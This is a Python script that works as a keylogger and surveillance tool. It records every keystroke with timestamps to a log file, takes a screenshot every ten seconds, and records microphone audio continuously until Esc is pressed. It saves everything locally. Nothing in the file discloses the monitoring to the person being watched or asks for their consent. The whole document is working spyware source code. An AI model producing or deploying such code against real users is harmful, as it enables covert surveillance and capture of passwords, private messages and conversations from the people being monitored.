from pynput.keyboard import Key, Listener as KeyboardListener
from datetime import datetime
import os
from PIL import ImageGrab
import time
import threading
import pyaudio
import wave

# Define the log file location and screenshot directory
log_file = "key_log.txt"
screenshot_dir = "screenshots"
audio_dir = "audio"

# Ensure necessary directories and files exist
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)
if not os.path.exists(audio_dir):
    os.makedirs(audio_dir)

# Event to stop recording
stop_event = threading.Event()

# Functions for keylogging
def write_to_log(message):
    """Write a message to the log file with timestamp."""
    with open(log_file, "a") as f:
        f.write(message + '\n')

def format_key(key):
    """Format the key as a string, handling special keys and characters."""
    try:
        return key.char
    except AttributeError:
        if key == Key.space:
            return " "
        elif key == Key.enter:
            return "\n"
        elif key == Key.backspace:
            return "<BACKSPACE>"
        elif key == Key.tab:
            return "<TAB>"
        elif key == Key.shift:
            return "<SHIFT>"
        elif key == Key.ctrl:
            return "<CTRL>"
        elif key == Key.alt:
            return "<ALT>"
        elif key == Key.caps_lock:
            return "<CAPSLOCK>"
        elif key == Key.esc:
            return "<ESC>"
        elif key == Key.up:
            return "<UP>"
        elif key == Key.down:
            return "<DOWN>"
        elif key == Key.left:
            return "<LEFT>"
        elif key == Key.right:
            return "<RIGHT>"
        else:
            return f"<{key.name.upper()}>"

def on_press(key):
    """Handle key press events and write them to the log file."""
    key_str = format_key(key)
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    message = f"{timestamp} - {key_str}"
    write_to_log(message)

def on_release(key):
    """Stop the listener and recording when 'Esc' is pressed."""
    if key == Key.esc:
        stop_event.set()  # Signal to stop the recording and screenshot threads
        return False  # Stop the key listener

# Functions for screenshots
def capture_screenshots(interval=10):
    """Capture screenshots at regular intervals."""
    while not stop_event.is_set():
        screenshot = ImageGrab.grab()
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        screenshot.save(os.path.join(screenshot_dir, f"screenshot_{timestamp}.png"))
        time.sleep(interval)

# Functions for audio recording
def record_audio():
    """Continuously record audio until the stop event is set."""
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16,
                    channels=1,
                    rate=44100,
                    input=True,
                    frames_per_buffer=1024)

    audio_file = os.path.join(audio_dir, f"audio_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.wav")
    print(f"Recording audio to {audio_file}...")
    frames = []

    try:
        while not stop_event.is_set():
            data = stream.read(1024)
            frames.append(data)
    except Exception as e:
        print(f"Error recording audio: {e}")
    finally:
        print("Finished recording, saving file.")
        stream.stop_stream()
        stream.close()
        p.terminate()

        wf = wave.open(audio_file, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))
        wf.close()

# Ensure the log file exists
if not os.path.isfile(log_file):
    with open(log_file, "w") as f:
        f.write("Keylogger Started\n")

# Set up and start the listener
listener = KeyboardListener(on_press=on_press, on_release=on_release)

# Start screenshot monitoring thread
screenshot_thread = threading.Thread(target=capture_screenshots, args=(10,), daemon=True)

# Start audio recording thread
audio_thread = threading.Thread(target=record_audio, daemon=True)

screenshot_thread.start()
audio_thread.start()
listener.start()
listener.join()

# Wait for threads to finish if 'Esc' is pressed
screenshot_thread.join()
audio_thread.join()
